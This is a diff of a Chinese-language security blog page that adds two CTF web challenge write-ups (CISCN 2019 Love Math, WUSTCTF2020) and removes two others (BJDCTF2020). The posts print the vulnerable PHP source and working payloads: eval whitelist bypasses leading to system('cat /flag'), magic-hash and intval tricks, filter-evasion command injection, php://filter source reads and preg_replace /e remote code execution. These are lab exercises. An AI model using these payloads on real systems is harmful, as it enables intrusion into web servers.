@@ -71,6 +71,105 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-72" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-72/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:47.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/13/page-72/">CISCN 2019 初赛Love Math</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>过滤了一些字符也给了一些白名单<br> &lt;?php<br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br>if(!isset($_GET[‘c’])){<br>    show_source(__ FILE__);<br>}else{<br>    //例子 c=20-1<br>    $content = $_GET[‘c’];<br>    if (strlen($content) &gt;= 80) {<br>        die(“太长了不会算”);<br>    }<br>    $blacklist = [‘ ‘, ‘\t’, ‘\r’, ‘\n’,’&#39;‘, ‘“‘, ‘`’, ‘[‘, ‘]‘];<br>    foreach ($blacklist as $blackitem) {<br>        if (preg_match(‘/‘ . $blackitem . ‘/m’, $content)) {<br>            die(“请不要输入奇奇怪怪的字符”);<br>        }<br>    }<br>    //常用数学函数<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/php/php_ref_math.asp">http://www.w3school.com.cn/php/php_ref_math.asp</a><br>    $whitelist = [‘abs’, ‘acos’, ‘acosh’, ‘asin’, ‘asinh’, ‘atan2’, ‘atan’, ‘atanh’, ‘base_convert’, ‘bindec’, ‘ceil’, ‘cos’, ‘cosh’, ‘decbin’, ‘dechex’, ‘decoct’, ‘deg2rad’, ‘exp’, ‘expm1’, ‘floor’, ‘fmod’, ‘getrandmax’, ‘hexdec’, ‘hypot’, ‘is_finite’, ‘is_infinite’, ‘is_nan’, ‘lcg_value’, ‘log10’, ‘log1p’, ‘log’, ‘max’, ‘min’, ‘mt_getrandmax’, ‘mt_rand’, ‘mt_srand’, ‘octdec’, ‘pi’, ‘pow’, ‘rad2deg’, ‘rand’, ‘round’, ‘sin’, ‘sinh’, ‘sqrt’, ‘srand’, ‘tan’, ‘tanh’];<br>    preg_match_all(‘/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/‘, $content, $used_funcs);<br>    foreach ($used_funcs[0] as $func) {<br>        if (!in_array($func, $whitelist)) {<br>            die(“请不要输入奇奇怪怪的函数”);<br>        }<br>    }<br>    //帮你算出答案<br>    eval(‘echo ‘.$content.’;’);<br>}<br><strong>白名单里面有一些可以使用base_convert()函数再任意进制见转换数字</strong><br><strong>base_convert(a,b,c）  a:必需，原始值 b:必须，数字原来的进制；c: 必须，要转换的进制。</strong><br><strong>hex2bin() 函数  将ascii码转成十六进制  dechex() 将十进制转换成十六进制</strong><br><strong>目标payload：</strong> ?c=system9”cat/flag”)  ;没有引号也可执行命令</p>
+<p>采用变量保存函数和参数</p>
+<p><strong>?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat/flag</strong><br>用whitelist内的函数替代<br>?c=($_GET[pi])($_GET[cos])&amp;pi=system&amp;cos=cat/flag<br>但是呢_GET不是白名单内的变量 [] 也被过滤了<br>[] 可以用{}替代<br>_GET 就得用hex2bin() 来转换</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/15.PNG?raw=true" alt="15.PNG"></p>
+<p>_GET -&gt; hex2bin(5f 47 45 54)<br>hex2bin这个也得转 发现hex2bin的36进制一摸一样 那就把36转10<br>hex2bin-&gt;base_convert(37907361743,10,36)</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/15.PNG?raw=true" alt="15.PNG"></p>
+<p>然后5f474554 还得转进制不然也会被过滤 1598506324</p>
+<p>5f474554-&gt;dechex(1598506324)<br>_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))<br>_GET得存进一个变量里面<br>$pi=base_convert(37907361743,10,36)(dechex(1598506324));<br>最终payload：  c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/17.PNG?raw=true" alt="17.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-72/" data-id="ckuzhneze0022v4w78wez2fry" data-title="CISCN 2019 初赛Love Math" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-71" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-71/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:45.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/13/page-71/">WUSTCTF2020朴实无华</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>扫后台扫到robots.txt</strong><br>访问得到源码<br>&lt;?php<br>header(‘Content-type:text/html;charset=utf-8’);<br>error_reporting(0);<br>highlight_file(__ file__);</p>
+<p>//level 1<br>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br>        echo “我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>“;<br>    }else{<br>        die(“金钱解决不了穷人的本质问题”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>//level 2<br>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br>       echo “想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>“;<br>   else<br>       die(“我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲”);<br>}else{<br>    die(“去非洲吧”);<br>}</p>
+<p>//get flag<br>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br>        echo “想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>“;<br>        system($get_flag);<br>    }else{<br>        die(“快到非洲了”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>?&gt; </p>
+<p>拿flag要过两关：</p>
+<p>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br><strong>假设num=1e8</strong><br><strong>intval函数 intval($num) 会被截断成1 但是intval（$num+1）会变成100000001 就能绕过这个2020 2021了</strong></p>
+<p>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br><strong>找到一串MD5加密前后一样的 祭出脚本大法</strong><br>import hashlib</p>
+<p>for i in range(0,10**41):<br>    i=’0e’+str(i)<br>    md5=hashlib.md5(i.encode()).hexdigest()<br>    if md5[:2]==’0e’ and md5[2:].isdigit():<br>        print(‘md5:{} ‘.format(i))<br>        break </p>
+<p><strong>得到：md5:0e215962017</strong>  </p>
+<p>?num=1e8&amp;md5=0e215962017 </p>
+<p>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br><strong>这边过滤了空格和cat会被替换成wctf2020</strong><br><strong>先看一下flag在哪num=1e7&amp;md5=0e215962017&amp;get_flag=ls</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/18.PNG?raw=true" alt="18.PNG"></p>
+<p>用%09绕过空格 然后cat用反斜杠绕过 ca\t<br>最终payload ：?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\t%09那一大长串</p>
+<p>​        </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/19.PNG?raw=true" alt="19.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-71/" data-id="ckuzhnezc001zv4w74oh64rag" data-title="WUSTCTF2020朴实无华" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-69" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/13/page-69/" class="article-date">
@@ -536,170 +635,6 @@ def checkSign(self):
 
 
   
-    <article id="post-page-61" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-61/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:52:01.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-61/">BJDCTF2020ZJCTF，不过如此  1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>先用php伪协议 读取next.php  获得的代码<br>text=data://text/plain;base64,aWhhdmVhZHJlYW0=(文本内容ihaveadream的base64)&amp;file=php://filter/read=convert.base64-encode/resource=next.php</p>
-<p>base64解码一下得到如下</p>
-<?php
-$id = $_GET['id'];
-$_SESSION['id'] = $id;
-
-function complex($re, $str) {
-    return preg_replace(
-        '/(' . $re . ')/ei',
-        'strtolower("\\1")',
-        $str
-    );
-}
-
-
-foreach($_GET as $re => $str) {
-    echo complex($re, $str). "\n";
-}
-
-function getFlag(){
-    @eval($_GET['cmd']);
-}
-**考preg_replace()的RCE**
-https://xz.aliyun.com/t/2557
-这篇文章就是讲这个的利用的
-\S*()={${eval($_POST[a])}}
-a=system%28%27cat+%2Fflag%27%29%3B
-preg_replace()的RCE
-payload 为：
-
- /?.*={${phpinfo()}}，
-
-
-即 GET 方式传入的参数名为 /?.* ，值为 {${phpinfo()}}
-
-payload2:
-
-\S*=${phpinfo()}
-payload:利用源码给的getFlag函数
-
-/next.php?\S*=${getflag()}&cmd=show_source(%22/flag%22);   在next.php下可以执行这个操作
-                                                    system('cat/flag');  这个不知道为什么不行看有的wp可以成功
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-61/" data-id="ckuzhnez8001pv4w724xve0ku" data-title="BJDCTF2020ZJCTF，不过如此  1" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-59" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-59/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:51:57.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-59/">BJDCTF2020Mark loves cat</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <?php
-include 'flag.php';
-$yds = "dog";
-$is = "cat";
-$handsome = 'yds';
-
-foreach($_POST as $x => $y){
-    $$x = $y;
-}
-
-foreach($_GET as $x => $y){              //通过post方式传递$flag=flag，最终结果为$$flag=flag    这便是POST方式处理代码
-    $$x = $$y;
-}
-
-foreach($_GET as $x => $y){
-    if($_GET['flag'] === $x && $x !== 'flag'){              //通过get传递yds=flag 得到$yds=$flag  
-        exit($handsome);
-    }
-}
-
-if(!isset($_GET['flag']) && !isset($_POST['flag'])){                          //get和post中不存在flag参数便退出程序输出$yds变量，得到flag 
-    exit($yds);
-}
-
-if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
-    exit($is);
-}
-
-echo "the flag is: ".$flag;"    //这是index.php 的源码
-**根据$$和foreach可以判断可能存在变量覆盖漏洞**，也就是可以将$yds，$is，$handsome的值进行覆盖成$flag变量，然后输出对应变量的值，获取flag。
-例如代码第17-19行，需要get传参?flag=flag，才能进入if语句中输出$handsome，但是foreach中并不能将$flag赋值给$handsome然后输出，所以此处无法利用。
-扫描**目录找到 .git 泄露** 
-**然后githack 把源码下下来**
-发现就两个重要文件，flag.php，读取flag文件内容并赋值给$flag:
-index.php，开头有个包含，在最后有个输出flag
- if(!isset($_GET['flag']) && !isset($_POST['flag'])){
-    exit($yds);
- }   发现get和post中不存在flag参数便退出程序输出$yds变量 
-传递如下参数 ：
-get: yds=flag
-post: $flag=flag
-
-那么最终payload  **?yds=flag**
-         **              post: $flag=flag**
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-59/" data-id="ckuzhnez8001qv4w7a54b9h2o" data-title="BJDCTF2020Mark loves cat" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -723,7 +658,7 @@ post: $flag=flag
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -736,6 +671,14 @@ post: $flag=flag
       <ul>
         
           <li>
+            <a href="/2022/08/21/page-129/">ISCC复现</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/21/page-128/">巅峰极客easy_Forensic</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/20/page-127/">web点2</a>
           </li>
         
@@ -745,14 +688,6 @@ post: $flag=flag
         
           <li>
             <a href="/2021/10/20/page-125/">杂项杂项</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
           </li>
         
       </ul>
